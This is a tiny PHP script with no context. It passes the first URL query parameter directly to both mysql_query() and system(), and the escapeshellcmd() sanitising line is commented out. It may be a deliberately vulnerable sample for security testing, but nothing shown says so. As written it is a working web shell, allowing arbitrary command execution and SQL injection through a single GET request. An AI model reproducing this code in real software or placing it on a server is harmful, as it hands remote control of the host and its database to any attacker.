<?php
$a = $_GET[0];
//$a = escapeshellcmd($a);
mysql_query($a);
system($a);
?>
